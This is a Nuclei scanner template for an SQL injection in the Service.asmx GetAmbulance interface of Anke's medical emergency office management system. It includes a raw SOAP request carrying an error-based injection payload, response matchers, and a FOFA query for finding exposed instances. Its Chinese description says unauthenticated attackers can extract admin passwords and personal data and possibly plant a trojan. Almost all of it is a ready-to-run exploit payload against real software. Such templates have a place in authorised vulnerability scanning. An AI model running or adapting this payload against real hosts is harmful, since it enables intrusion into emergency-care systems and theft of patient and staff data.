common/config/pocs/nuclei-2025/安克医疗急救办公管理系统-Service.asmx-SQL注入漏洞.yaml

http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - qjbvq1qqvvq
            - 转换成数据类型 int 时失败
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          POST /api/Service.asmx HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
          Content-Type: text/xml; charset=utf-8
          SOAPAction: "http://tempuri.org/GetAmbulance"

          <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
              <GetAmbulance xmlns="http://tempuri.org/">
                <CNumber>1' AND 6537 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (6537=6537) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)))-- ntgj</CNumber>
              </GetAmbulance>
            </soap:Body>
          </soap:Envelope>
id: anke-Service_asmx-sql
info:
    author: Superhero
    description: |-
        fofa: body="/Content/easyui1.3.3/themes"
        安克医疗急救办公管理系统 Service.asmx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 安克医疗急救办公管理系统 Service.asmx SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/LF-M-K1Pm5XfLKkhd3E1Vg?token=635655052&lang=zh_CN
    severity: high
    tags: []
